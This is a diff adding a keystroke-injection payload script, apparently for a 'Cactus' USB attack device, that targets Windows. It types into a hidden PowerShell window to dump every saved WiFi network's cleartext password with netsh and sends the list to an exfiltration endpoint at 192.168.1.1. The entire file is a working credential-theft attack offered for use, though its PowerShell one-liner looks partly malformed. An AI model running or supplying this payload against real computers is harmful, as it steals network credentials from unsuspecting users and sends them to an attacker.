@@ -1,0 +1,10 @@
+Rem:Dump saved WiFi passwords and exfiltrate to Cactus (Windows)
+Rem:Opens PowerShell, extracts WiFi profiles, POSTs to Cactus exfil endpoint
+CustomDelay:500
+Press:131+114
+CustomDelay:500
+Print:powershell -w hidden
+Press:176
+CustomDelay:1000
+Print:$d=(netsh wlan show profiles|Select-String 'All User'):Foreach{$n=$_.ToString().Split(':')[1].Trim();$p=(netsh wlan show profile name=$n key=clear|Select-String 'Key Content').ToString().Split(':')[1].Trim();$d+="$n : $p`n"};Invoke-WebRequest -Uri "http://192.168.1.1/exfiltrate?file=wifi.txt&data=$([uri]::EscapeDataString($d))" -Method GET
+Press:176
